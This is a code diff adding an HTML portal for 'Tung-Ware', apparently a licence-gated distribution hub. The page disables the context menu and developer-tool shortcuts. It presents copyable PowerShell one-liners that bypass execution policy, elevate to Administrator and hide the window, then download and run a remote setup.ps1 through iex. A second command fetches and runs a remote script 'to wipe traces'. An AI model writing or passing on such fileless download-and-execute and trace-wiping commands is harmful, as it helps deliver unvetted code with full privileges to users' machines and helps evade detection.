@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script>
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) ||
+        (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
+        e.preventDefault();
+        return false;
+    }
+});
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tung-Ware Updates Center</title>
+    <link rel="stylesheet" href="style.css?v=3">
+</head>
+<body>
+    
+    <div class="bg-grid"></div>
+    <div class="bg-radial"></div>
+    <div class="bg-blob-1"></div>
+    <div class="bg-blob-2"></div>
+
+    
+    <div id="loader-overlay">
+        <div class="loader-content">
+            <div class="loader-ring">
+                <svg class="loader-ring-svg" viewBox="0 0 120 120">
+                    <defs>
+                        <linearGradient id="loader-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#00f2fe" />
+                            <stop offset="100%" stop-color="#6366f1" />
+                        </linearGradient>
+                    </defs>
+                    <circle class="loader-ring-bg" cx="60" cy="60" r="54" />
+                    <circle class="loader-ring-progress" id="loader-progress" cx="60" cy="60" r="54" />
+                </svg>
+                <div class="loader-percentage" id="loader-percentage">0%</div>
+            </div>
+            <h2 class="loader-title">TUNG-WARE</h2>
+            <p class="loader-subtitle">Secure Telemetry Sync</p>
+            <div class="loader-console" id="loader-console"></div>
+
+            
+            <div id="auth-gate-card" class="panel" style="display: none; text-align: left; margin-top: 20px; background: rgba(5, 8, 18, 0.9); border: 1px solid rgba(0, 242, 254, 0.15); box-shadow: var(--shadow-neon-cyan); border-radius: 12px; padding: 20px;">
+                <div style="display: flex; justify-content: space-around; border-bottom: 1px solid rgba(255,255,255,0.08); margin-bottom: 20px;">
+                    <button id="tab-login" class="tab-btn active" style="background: none; border: none; color: var(--text-primary); font-family: var(--font-title); font-size: 14px; font-weight: 700; padding: 10px 20px; cursor: pointer; border-bottom: 2px solid var(--neon-cyan); outline: none;">LOG IN</button>
+                    <button id="tab-register" class="tab-btn" style="background: none; border: none; color: var(--text-secondary); font-family: var(--font-title); font-size: 14px; font-weight: 700; padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; outline: none;">REGISTER</button>
+                </div>
+
+                
+                <div id="form-login-section">
+                    <div class="input-group" style="margin-bottom: 15px;">
+                        <label style="color: var(--text-secondary); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: 6px;">Username</label>
+                        <input type="text" id="gate-login-user" class="text-input" placeholder="Enter username..." style="width: 100%; box-sizing: border-box;">
+                    </div>
+                    <div class="input-group" style="margin-bottom: 15px;">
+                        <label style="color: var(--text-secondary); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: 6px;">Password</label>
+                        <input type="password" id="gate-login-pass" class="text-input" placeholder="Enter password..." style="width: 100%; box-sizing: border-box;">
+                    </div>
+                    <button class="btn btn-primary" id="btn-gate-login" style="width: 100%; margin-top: 10px; font-family: var(--font-title); font-weight: 700;">Verify & Enter Portal</button>
+                    <div id="gate-login-feedback" style="margin-top: 10px; font-size: 12px; font-family: monospace; color: var(--neon-cyan); height: 18px; text-align: center;"></div>
+                </div>
+
+                
+                <div id="form-register-section" style="display: none;">
+                    <div class="input-group" style="margin-bottom: 15px;">
+                        <label style="color: var(--text-secondary); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: 6px;">Choose Username</label>
+                        <input type="text" id="gate-reg-user" class="text-input" placeholder="Min 3 characters..." style="width: 100%; box-sizing: border-box;">
+                    </div>
+                    <div class="input-group" style="margin-bottom: 15px;">
+                        <label style="color: var(--text-secondary); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: 6px;">Choose Password</label>
+                        <input type="password" id="gate-reg-pass" class="text-input" placeholder="Min 6 characters..." style="width: 100%; box-sizing: border-box;">
+                    </div>
+                    <div class="input-group" style="margin-bottom: 15px;">
+                        <label style="color: var(--text-secondary); font-size: 11px; text-transform: uppercase; letter-spacing: 1px; display: block; margin-bottom: 6px;">License Activation Key</label>
+                        <input type="text" id="gate-reg-key" class="text-input" placeholder="Format: TUNG-XXXX-XXXX-XXXX" style="width: 100%; box-sizing: border-box;">
+                    </div>
+                    <button class="btn btn-primary" id="btn-gate-register" style="width: 100%; margin-top: 10px; background: linear-gradient(135deg, #f59e0b 0%, #ea580c 100%); font-family: var(--font-title); font-weight: 700;">Register & Activate Key</button>
+                    <div id="gate-reg-feedback" style="margin-top: 10px; font-size: 12px; font-family: monospace; color: var(--neon-gold); height: 18px; text-align: center;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="copied-toast" id="copied-toast">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+        <span>Command Copied to Clipboard</span>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="status-badge">
+                <span class="status-dot"></span>
+                System Node: Active
+            </div>
+            <h1 class="logo-title">TUNG-WARE</h1>
+            <div class="subtitle">Secure Distribution Hub</div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">
+                <span class="panel-title-icon">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="9" x2="15" y2="9"></line><line x1="9" y1="13" x2="15" y2="13"></line><line x1="9" y1="17" x2="11" y2="17"></line></svg>
+                </span>
+                Active Telemetry & Release Logs
+            </div>
+            
+            <div class="stats-grid">
+                <div class="stat-card active-version">
+                    <div class="stat-val" id="lbl-version">-.-.-</div>
+                    <div class="stat-lbl">Active Version</div>
+                </div>
+                <div class="stat-card total-downloads">
+                    <div class="stat-val" id="lbl-downloads">0</div>
+                    <div class="stat-lbl">Downloads</div>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Release Timestamp</label>
+                <div class="text-input" id="lbl-date" style="display: flex; align-items: center; background: rgba(5, 7, 15, 0.5);" readonly>-</div>
+            </div>
+
+            <div class="input-group" style="margin-bottom: 5px;">
+                <label>Changelog Details</label>
+                <div class="changelog-box" id="lbl-changelog">
+                    Initialising update logs...
+                </div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title">
+                <span class="panel-title-icon">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+                </span>
+                Fileless Deploy Command
+            </div>
+            <label>Run this command once in PowerShell (as Administrator) to load:</label>
+            <div class="command-block">
+                <input type="text" id="powershell-cmd" class="text-input" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -Command &amp; { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString(''__HOST_URL__/setup.ps1'') }' -Verb RunAs&quot;">
+                <button id="btn-copy" class="btn-inline-copy">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                    Copy
+                </button>
+            </div>
+        </div>
+
+        <div class="panel" style="margin-bottom: 30px;">
+            <div class="panel-title" style="color: var(--neon-rose);">
+                <span class="panel-title-icon" style="background: rgba(244, 63, 94, 0.08); border-color: rgba(244, 63, 94, 0.2); color: var(--neon-rose); box-shadow: var(--shadow-neon-rose);">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+                </span>
+                Stealth Trace Cleanup Command
+            </div>
+            <label>Run this command once in PowerShell (as Administrator) to wipe traces:</label>
+            <div class="command-block" style="border-color: rgba(244, 63, 94, 0.15);">
+                <input type="text" id="cleanup-cmd" class="text-input" readonly value="powershell -ExecutionPolicy Bypass -Command &quot;Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command &amp; { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString(''__HOST_URL__/cleanup'') }' -Verb RunAs&quot;">
+                <button id="btn-copy-cleanup" class="btn-inline-copy">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                    Copy
+                </button>
+            </div>
+        </div>
+
+        
+        <div class="panel">
+            <div class="panel-title" style="color: var(--neon-gold);">
+                <span class="panel-title-icon" style="background: rgba(245, 158, 11, 0.08); border-color: rgba(245, 158, 11, 0.2); color: var(--neon-gold);">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                </span>
+                Extend Subscription License Key
+            </div>
+            <div class="input-group">
+                <label>Username</label>
+                <input type="text" id="act-username" class="text-input" placeholder="Enter account username...">
+            </div>
+            <div class="input-group">
+                <label>License Key</label>
+                <input type="text" id="act-key" class="text-input" placeholder="Format: TUNG-XXXX-XXXX-XXXX">
+            </div>
+            <button class="btn btn-primary" id="btn-activate-key" style="width: 100%; height: 38px; font-size: 13px; background: linear-gradient(135deg, #f59e0b 0%, #ea580c 100%);">Redeem License Hours</button>
+            <div id="act-feedback" style="margin-top: 10px; font-size: 12px; font-family: monospace; color: var(--neon-gold); text-align: center;"></div>
+        </div>
+
+        <a href="/download" class="btn btn-primary" id="btn-download" style="text-decoration: none;">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+            Download Setup Script (setup.ps1)
+        </a>
+    </div>
+
+    <script>
+        const lblVersion = document.getElementById('lbl-version');
+        const lblDownloads = document.getElementById('lbl-downloads');
+        const lblDate = document.getElementById('lbl-date');
+        const lblChangelog = document.getElementById('lbl-changelog');
+        const btnDownload = document.getElementById('btn-download');
+        const powershellCmd = document.getElementById('powershell-cmd');
+        const btnCopy = document.getElementById('btn-copy');
+        const cleanupCmd = document.getElementById('cleanup-cmd');
+        const btnCopyCleanup = document.getElementById('btn-copy-cleanup');
+        const toast = document.getElementById('copied-toast');
+
+        
+        const isGitHubPages = window.location.hostname.endsWith('github.io') || window.location.pathname.includes('/tung-ware');
+        let fileBaseUrl = window.location.origin;
+        let apiVersionUrl = '/api/release/latest';
+        let setupUrl = window.location.origin + '/setup.ps1';
+        let cleanupUrl = window.location.origin + '/cleanup';
+        let downloadButtonUrl = '/download';
+
+        if (isGitHubPages) {
+            
+            fileBaseUrl += '/tung-ware/files';
+            apiVersionUrl = fileBaseUrl + '/releases.json';
+            setupUrl = fileBaseUrl + '/setup.ps1';
+            cleanupUrl = fileBaseUrl + '/cleanup.ps1';
+            downloadButtonUrl = fileBaseUrl + '/setup.ps1';
+        }
+
+        
+        btnDownload.setAttribute('href', downloadButtonUrl);
+
+        
+        powershellCmd.value = powershellCmd.value.replace('__HOST_URL__/setup.ps1', setupUrl);
+        cleanupCmd.value = cleanupCmd.value.replace('__HOST_URL__/cleanup', cleanupUrl);
+
+        
+        function showToast(text) {
+            toast.querySelector('span').textContent = text;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        
+        btnCopy.addEventListener('click', () => {
+            powershellCmd.select();
+            powershellCmd.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(powershellCmd.value);
+            
+            btnCopy.classList.add('copied');
+            btnCopy.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied`;
+            showToast("Deploy Command Copied to Clipboard");
+            setTimeout(() => {
+                btnCopy.classList.remove('copied');
+                btnCopy.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy`;
+            }, 2000);
+        });
+
+        
+        btnCopyCleanup.addEventListener('click', () => {
+            cleanupCmd.select();
+            cleanupCmd.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(cleanupCmd.value);
+            
+            btnCopyCleanup.classList.add('copied');
+            btnCopyCleanup.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied`;
+            showToast("Cleanup Command Copied to Clipboard");
+            setTimeout(() => {
+                btnCopyCleanup.classList.remove('copied');
+                btnCopyCleanup.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2 2v1"></path></svg> Copy`;
+            }, 2000);
+        });
+
+        
+        document.querySelectorAll('.panel').forEach(panel => {
+            panel.addEventListener('mousemove', e => {
+                const rect = panel.getBoundingClientRect();
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                panel.style.setProperty('--mouse-x', `${x}px`);
+                panel.style.setProperty('--mouse-y', `${y}px`);
+            });
+        });
+
+        
+        const loaderConsole = document.getElementById('loader-console');
+        const loaderProgress = document.getElementById('loader-progress');
+        const loaderPercentage = document.getElementById('loader-percentage');
+        const loaderOverlay = document.getElementById('loader-overlay');
+        const loaderRing = document.querySelector('.loader-ring');
+
+        const diagMessages = [
+            { text: "STATION CONNECTION REQUEST...", type: "system" },
+            { text: "ESTABLISHING HANDSHAKE WITH PORT 443...", type: "system" },
+            { text: "ACCESSING TUNG-WARE NODE GATEWAY...", type: "system" },
+            { text: "ENCRYPTED SESSION SYNCING...", type: "success" },
+            { text: "FETCHING REMOTE TELEMETRY LOGS...", type: "system" },
+            { text: "DECRYPTING DATABASE RECORDS...", type: "system" },
+            { text: "HASHING METADATA INTEGRITY...", type: "success" },
+            { text: "INTERFACE CONFIGURATION COMPLETED.", type: "success" }
+        ];
+
+        let releaseDataLoaded = false;
+        let releaseError = null;
+
+        async function fetchLatestRelease() {
+            try {
+                const response = await fetch(apiVersionUrl);
+                const data = await response.json();
+                
+                let version, downloads, date, changelog;
+                if (data.latestVersion !== undefined) {
+                    version = data.latestVersion;
+                    downloads = data.totalDownloads;
+                    changelog = data.latestChangelog;
+                    const lastHistory = data.history && data.history.length > 0 ? (data.history.find(h => h.version === data.latestVersion) || data.history[data.history.length - 1]) : null;
+                    date = lastHistory ? lastHistory.date : '-';
+                } else if (data.success) {
+                    version = data.version;
+                    downloads = data.totalDownloads;
+                    date = data.date;
+                    changelog = data.changelog;
+                }
+
+                if (version) {
+                    lblVersion.textContent = `v${version}`;
+                    lblDownloads.textContent = downloads.toLocaleString();
+                    lblDate.textContent = date;
+                    lblChangelog.textContent = changelog;
+                } else {
+                    lblChangelog.textContent = 'Failed to load details from the active update node.';
+                }
+                releaseDataLoaded = true;
+            } catch (err) {
+                lblChangelog.textContent = 'Failed to connect to the distribution service.';
+                releaseError = err;
+                releaseDataLoaded = true;
+            }
+        }
+
+        
+        fetchLatestRelease();
+
+        
+        let progress = 0;
+        let logIndex = 0;
+        const totalSteps = diagMessages.length;
+
+        function updateProgressCircle(pct) {
+            const radius = 54;
+            const circumference = 2 * Math.PI * radius; 
+            const offset = circumference - (pct / 100) * circumference;
+            loaderProgress.style.strokeDashoffset = offset;
+            loaderPercentage.textContent = `${Math.floor(pct)}%`;
+        }
+
+        function appendConsoleLine(messageObj) {
+            const line = document.createElement('div');
+            line.className = 'loader-log-line';
+            if (messageObj.type) line.classList.add(messageObj.type);
+            line.textContent = `> ${messageObj.text}`;
+            loaderConsole.appendChild(line);
+            loaderConsole.scrollTop = loaderConsole.scrollHeight;
+        }
+
+        function runLoader() {
+            const interval = setInterval(() => {
+                
+                progress += (100 / totalSteps) / 4; 
+
+                
+                const currentMsgIndex = Math.floor((progress / 100) * totalSteps);
+                if (logIndex < currentMsgIndex && logIndex < totalSteps) {
+                    appendConsoleLine(diagMessages[logIndex]);
+                    logIndex++;
+                }
+
+                 if (progress >= 100) {
+                     progress = 100;
+                     updateProgressCircle(progress);
+                     clearInterval(interval);
+
+                     
+                     setTimeout(() => {
+                         loaderRing.style.transition = 'opacity 0.5s';
+                         loaderConsole.style.transition = 'opacity 0.5s';
+                         loaderRing.style.opacity = 0;
+                         loaderConsole.style.opacity = 0;
+                         
+                         setTimeout(() => {
+                             loaderRing.style.display = 'none';
+                             loaderConsole.style.display = 'none';
+                             
+                             
+                             const gateCard = document.getElementById('auth-gate-card');
+                             gateCard.style.display = 'block';
+                             gateCard.style.opacity = 0;
+                             gateCard.style.transition = 'opacity 0.5s';
+                             setTimeout(() => { gateCard.style.opacity = 1; }, 50);
+                         }, 500);
+                     }, 500);
+                 } else {
+                     updateProgressCircle(progress);
+                 }
+             }, 60);
+         }
+
+         
+         runLoader();
+
+         
+         const tabLogin = document.getElementById('tab-login');
+         const tabRegister = document.getElementById('tab-register');
+         const formLogin = document.getElementById('form-login-section');
+         const formRegister = document.getElementById('form-register-section');
+
+         tabLogin.addEventListener('click', () => {
+             tabLogin.style.borderBottomColor = 'var(--neon-cyan)';
+             tabLogin.style.color = 'var(--text-primary)';
+             tabRegister.style.borderBottomColor = 'transparent';
+             tabRegister.style.color = 'var(--text-secondary)';
+             formLogin.style.display = 'block';
+             formRegister.style.display = 'none';
+         });
+
+         tabRegister.addEventListener('click', () => {
+             tabRegister.style.borderBottomColor = 'var(--neon-gold)';
+             tabRegister.style.color = 'var(--text-primary)';
+             tabLogin.style.borderBottomColor = 'transparent';
+             tabLogin.style.color = 'var(--text-secondary)';
+             formLogin.style.display = 'none';
+             formRegister.style.display = 'block';
+         });
+
+         
+         function grantAccess(username) {
+             
+             document.getElementById('act-username').value = username;
+
+             
+             document.querySelector('.container').classList.add('revealed');
+             
+             setTimeout(() => {
+                 loaderOverlay.style.opacity = 0;
+                 setTimeout(() => {
+                     loaderOverlay.style.visibility = 'hidden';
+                 }, 800);
+             }, 500);
+         }
+
+         
+         const gateLoginUser = document.getElementById('gate-login-user');
+         const gateLoginPass = document.getElementById('gate-login-pass');
+         const btnGateLogin = document.getElementById('btn-gate-login');
+         const gateLoginFeedback = document.getElementById('gate-login-feedback');
+
+         btnGateLogin.addEventListener('click', async () => {
+             const username = gateLoginUser.value.trim();
+             const password = gateLoginPass.value.trim();
+             if (!username || !password) return;
+
+             gateLoginFeedback.textContent = 'Verifying credentials...';
+             gateLoginFeedback.style.color = 'var(--neon-cyan)';
+             try {
+                 const response = await fetch('/api/auth/login', {
+                     method: 'POST',
+                     headers: { 'Content-Type': 'application/json' },
+                     body: JSON.stringify({ username, password })
+                 });
+                 const data = await response.json();
+                 if (data.success) {
+                     gateLoginFeedback.innerHTML = '<span style="color: var(--accent-green);">Access Granted. Entering portal...</span>';
+                     setTimeout(() => { grantAccess(username); }, 600);
+                 } else {
+                     gateLoginFeedback.innerHTML = `<span style="color: var(--neon-rose);">${data.error}</span>`;
+                 }
+             } catch (err) {
+                 gateLoginFeedback.innerHTML = '<span style="color: var(--neon-rose);">Connection failed.</span>';
+             }
+         });
+
+         
+         const gateRegUser = document.getElementById('gate-reg-user');
+         const gateRegPass = document.getElementById('gate-reg-pass');
+         const gateRegKey = document.getElementById('gate-reg-key');
+         const btnGateRegister = document.getElementById('btn-gate-register');
+         const gateRegFeedback = document.getElementById('gate-reg-feedback');
+
+         btnGateRegister.addEventListener('click', async () => {
+             const username = gateRegUser.value.trim();
+             const password = gateRegPass.value.trim();
+             const licenseKey = gateRegKey.value.trim();
+
+             if (!username || !password || !licenseKey) return;
+
+             gateRegFeedback.textContent = 'Validating key & registering...';
+             gateRegFeedback.style.color = 'var(--neon-gold)';
+             try {
+                 const response = await fetch('/api/auth/register', {
+                     method: 'POST',
+                     headers: { 'Content-Type': 'application/json' },
+                     body: JSON.stringify({ username, password, licenseKey })
+                 });
+                 const data = await response.json();
+                 if (data.success) {
+                     gateRegFeedback.innerHTML = '<span style="color: var(--accent-green);">Registration Success! Logging in...</span>';
+                     setTimeout(() => { grantAccess(username); }, 1000);
+                 } else {
+                     gateRegFeedback.innerHTML = `<span style="color: var(--neon-rose);">${data.error}</span>`;
+                 }
+             } catch (err) {
+                 gateRegFeedback.innerHTML = '<span style="color: var(--neon-rose);">Connection failed.</span>';
+             }
+         });
+
+         
+         btnDownload.addEventListener('click', () => {
+             setTimeout(() => {
+                 const cur = parseInt(lblDownloads.textContent.replace(/,/g, ''));
+                 if (!isNaN(cur)) {
+                     lblDownloads.textContent = (cur + 1).toLocaleString();
+                 }
+             }, 300);
+         });
+
+         
+         const actUsername = document.getElementById('act-username');
+         const actKey = document.getElementById('act-key');
+         const btnActivateKey = document.getElementById('btn-activate-key');
+         const actFeedback = document.getElementById('act-feedback');
+
+         btnActivateKey.addEventListener('click', async () => {
+             const username = actUsername.value.trim();
+             const key = actKey.value.trim();
+             if (!username || !key) return;
+
+             actFeedback.textContent = 'Activating key...';
+             try {
+                 const response = await fetch('/api/auth/activate', {
+                     method: 'POST',
+                     headers: { 'Content-Type': 'application/json' },
+                     body: JSON.stringify({ username, licenseKey: key })
+                 });
+                 const data = await response.json();
+                 if (data.success) {
+                     actFeedback.innerHTML = `<span style="color: var(--accent-green);">${data.message}</span>`;
+                     actKey.value = '';
+                 } else {
+                     actFeedback.innerHTML = `<span style="color: var(--neon-rose);">${data.error}</span>`;
+                 }
+             } catch (err) {
+                 actFeedback.innerHTML = '<span style="color: var(--neon-rose);">Connection failed.</span>';
+             }
+         });
+    </script>
+</body>
+</html>
